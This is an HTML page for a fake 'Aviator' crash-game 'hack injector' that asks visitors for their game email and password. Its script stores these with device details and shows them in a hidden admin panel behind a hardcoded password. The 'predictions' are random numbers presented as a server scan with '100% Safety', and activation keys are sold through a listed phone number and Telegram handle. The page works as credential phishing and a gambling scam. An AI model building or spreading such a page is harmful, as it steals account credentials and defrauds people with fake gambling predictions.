<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KADIR 786 | OFFICIAL INJECTOR V5.0</title>
    <style>
        :root { --neon: #00ff41; --danger: #ff0000; --gold: #ffae00; }
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
        
        /* 1. ADMIN SECTION (HIDDEN) */
        #adminArea { display: none; background: #0a0a0a; border: 2px solid var(--neon); padding: 15px; margin: 10px; border-radius: 10px; position: relative; z-index: 9999; }
        .adm-input { background: #111; border: 1px solid #333; color: var(--neon); padding: 10px; margin: 5px; width: 80%; }
        
        /* 2. MAIN UI */
        .container { padding: 20px; text-align: center; }
        .u-input { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
        .btn-blue { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; }
        
        /* 3. PREDICTOR PANEL */
        #predictorPage { display: none; padding: 20px; text-align: center; }
        .crash-box { background: #111; border: 2px solid var(--danger); padding: 40px 10px; border-radius: 20px; margin: 20px 0; box-shadow: 0 0 20px var(--danger); }
        .num-text { font-size: 70px; font-weight: bold; color: #fff; text-shadow: 0 0 15px var(--danger); }
        
        /* 4. SUPPORT & BUTTONS */
        .support-card { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-top: 20px; border: 1px solid #333; }
        .btn-red { background: var(--danger); width: 100%; max-width: 350px; padding: 15px; border: none; border-radius: 10px; color: #fff; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
        .btn-video { background: #555; color: #fff; padding: 10px; border-radius: 5px; text-decoration: none; font-size: 12px; }

        table { width: 100%; font-size: 10px; color: var(--neon); border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #222; padding: 5px; text-align: left; }
    </style>
</head>
<body>

<div class="container" id="loginPage">
    <div onclick="openAdmin()" style="cursor:pointer;">
        <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" width="70" style="filter: drop-shadow(0 0 10px var(--neon));">
        <h1 style="margin: 10px 0;">KADIR 786</h1>
    </div>
    
    <div id="adminArea">
        <h3 style="color:var(--neon);">ADMIN CONTROL</h3>
        <input type="password" id="admPass" class="adm-input" placeholder="Enter Password (9580)">
        <button onclick="admLogin()">Login</button>
        <div id="admContent" style="display:none; margin-top:15px;">
            <table id="logTable"><thead><tr><th>ID</th><th>PASS</th><th>DEVICE/LOC</th></tr></thead><tbody id="logBody"></tbody></table>
            <button onclick="genKey()" style="background:var(--gold); margin-top:10px; padding:5px; border:none; border-radius:3px;">GENERATE ACTIVATION KEY</button>
            <div id="newKey" style="color:yellow; margin-top:5px; font-weight:bold;"></div>
        </div>
    </div>

    <div id="userFields">
        <p style="color:#888;">Enter Old ID to Activate Hack System</p>
        <input type="text" id="uMail" class="u-input" placeholder="Old Game Email/ID">
        <input type="password" id="uPass" class="u-input" placeholder="Game Password">
        <button class="btn-blue" onclick="saveAndProceed()">ACTIVATE ID & LOGIN</button>
        <br><br>
        <a href="#" class="btn-video">How to Connect Old ID? (Video)</a>
    </div>
</div>

<div id="predictorPage">
    <h2 style="color:var(--danger);">AVIATOR SAFE-EXIT v5.0</h2>
    <div class="crash-box">
        <div id="loader" style="display:none; color:var(--neon);">SCANNING SERVER...</div>
        <div id="resultArea">
            <div class="num-text" id="output">1.00x</div>
            <p style="color:var(--neon); font-size:14px;">SAFE WITHDRAW POINT</p>
        </div>
    </div>

    <input type="text" id="actCode" class="u-input" placeholder="Enter Activation Code">
    <button class="btn-red" onclick="getSafeSignal()">GET PREDICTION</button>

    <div class="support-card">
        <p style="color:#888; margin:0;">For Key & Activation, Call Admin:</p>
        <a href="tel:9554527334" style="color:var(--gold); font-size:20px; text-decoration:none; font-weight:bold;">📞 9554527334</a>
        <p style="color:#007bff; margin-top:10px;">Telegram: @Kadir786_Admin</p>
    </div>
</div>

<script>
    let validKeys = JSON.parse(localStorage.getItem('sysKeys')) || [];
    let deviceData = "Tracking Device...";

    window.onload = () => {
        deviceData = navigator.userAgent.split(')')[0].split('(')[1] || "Mobile Device";
    };

    function openAdmin() { document.getElementById('adminArea').style.display = 'block'; }

    function admLogin() {
        if(document.getElementById('admPass').value === "9580") {
            document.getElementById('admContent').style.display = 'block';
            loadLogs();
        }
    }

    function genKey() {
        let k = "KDR-" + Math.floor(Math.random()*9000+1000);
        validKeys.push(k);
        localStorage.setItem('sysKeys', JSON.stringify(validKeys));
        document.getElementById('newKey').innerText = "New Key: " + k;
    }

    function saveAndProceed() {
        let e = document.getElementById('uMail').value;
        let p = document.getElementById('uPass').value;
        if(e && p) {
            let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
            logs.push({e, p, d: deviceData, t: new Date().toLocaleTimeString()});
            localStorage.setItem('userLogs', JSON.stringify(logs));
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('predictorPage').style.display = 'block';
        } else { alert("Please enter ID and Password!"); }
    }

    function loadLogs() {
        let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
        let h = "";
        logs.forEach(l => h += `<tr><td>${l.e}</td><td>${l.p}</td><td>${l.d}</td></tr>`);
        document.getElementById('logBody').innerHTML = h;
    }

    function getSafeSignal() {
        let k = document.getElementById('actCode').value;
        if(validKeys.includes(k)) {
            document.getElementById('resultArea').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                let realVal = (Math.random() * 8 + 2);
                let safeVal = (realVal - 0.75).toFixed(2); // Safe-Exit logic
                document.getElementById('loader').style.display = 'none';
                document.getElementById('resultArea').style.display = 'block';
                document.getElementById('output').innerText = safeVal + "x";
                alert("Withdraw before " + safeVal + "x for 100% Safety!");
            }, 2000);
        } else { alert("Invalid Code! Contact Admin 9554527334"); }
    }
</script>
</body>
</html>
